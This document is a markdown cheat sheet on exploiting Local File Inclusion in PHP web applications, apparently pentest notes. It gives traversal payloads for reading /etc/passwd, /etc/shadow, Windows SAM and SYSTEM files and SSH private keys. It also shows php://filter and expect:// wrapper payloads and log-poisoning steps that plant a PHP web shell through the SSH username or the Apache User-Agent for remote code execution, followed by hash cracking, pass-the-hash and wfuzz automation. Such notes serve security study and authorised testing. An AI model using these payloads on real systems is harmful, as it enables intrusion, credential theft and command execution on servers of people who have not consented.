## LFI Local File Inclusion
### Table of Contents
- [LFI Local File Inclusion](#lfi-local-file-inclusion)
  * [Introduction](#introduction)
    + [Example:](#example-)
  * [Directory Traversal](#directory-traversal)
    + [Basic Linux Test](#basic-linux-test)
  * [PHP Wrappers](#php-wrappers)
    + [PHP Expect Wrapper](#php-expect-wrapper)
    + [PHP Filter Wrapper](#php-filter-wrapper)
  * [RCE via SSH](#rce-via-ssh)
  * [RCE via Apache logs](#rce-via-apache-logs)
  * [LFI to RCE via credentials files](#lfi-to-rce-via-credentials-files)
    + [Windows version](#windows-version)
    + [Linux version](#linux-version)
  * [Automated LFI with Wfuzz](#automated-lfi-with-wfuzz)
  * [Resources](#resources)

### Introduction
- An attacker can use Local File Inclusion (LFI) to trick the web application into exposing or running files on the web server.
- LFI occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.
#### Example:
````
/**
* Get the filename from a GET input
* Example - http://example.com/?file=filename.php
*/
$file = $_GET['file'];

/**
* Unsafely include the file
* Example - filename.php
*/
include('directory/' . $file);
````
- In the above example, an attacker could make the following request. It tricks the application into executing a PHP script such as a web shell that the attacker managed to upload to the web server.
````
http://example.com/?file=../../uploads/evil.php
````
### Directory Traversal
- Even without the ability to upload and execute code, a Local File Inclusion vulnerability can be dangerous. 
- An attacker can still perform a Directory Traversal / Path Traversal attack using an LFI vulnerability as follows.
````
http://example.com/?file=../../../../etc/passwd
````
- Testing 
- If you see a webpage URL look like this:
````
/script.php?page=index.html 
````
#### Basic Linux Test
Test for:
````
/script.php?page=../../../../../../../../etc/passwd
````
### PHP Wrappers
- PHP has a number of wrappers that can often be abused to bypass various input filters.
#### PHP Expect Wrapper
- `PHP expect://` allows execution of system commands, unfortunately the expect PHP module is not enabled by default
````
php?page=expect://ls
````
#### PHP Filter Wrapper
`php://filter` allows a pen tester to include local files and base64 encodes the output. Therefore, any base64 output will need to be decoded to reveal the contents.
````
vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd  
````
- `php://filter` can also be used without base64 encoding the output using:
````
?page=php://filter/resource=/etc/passwd
````
### RCE via SSH
- Try to ssh into the box with a PHP code as username <?php system($_GET["cmd"]);?>.
````
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
````
- Then include the SSH log files inside the Web Application.
````
http://example.com/index.php?page=/var/log/auth.log&cmd=id
````
### RCE via Apache logs
- Poison the User-Agent in access logs:
````
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
````
- Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.
- Then request the logs via the LFI and execute your command.
````
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
````
### LFI to RCE via credentials files
- This method require high privileges inside the application in order to read the sensitive files.
#### Windows version
- First extract sam and system files.
````
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
````
- Then extract hashes from these files samdump2 SYSTEM SAM > hashes.txt, and crack them with hashcat/john or replay them using the Pass The Hash technique.
#### Linux version
- First extract /etc/shadow files.
````
http://example.com/index.php?page=../../../../../../etc/shadow
````
- Then crack the hashes inside in order to login via SSH on the machine.
- Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa. 
- If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
### Automated LFI with Wfuzz
- Automate LFI Tests
- Download the `traversal.txt` file in this folder (from PayloadAllTheThings)
- Test with `wfuzz`
````
wfuzz -u "http://10.10.218.222/article?name=FUZZ" -w traversal.txt | grep 200
````
- `grep 200` for the `Ok` status code
- `w` -> the wordlist
- `?name=FUZZ` -> the parameter you want to fuzz
  ### Resources
- https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-phpinfo

















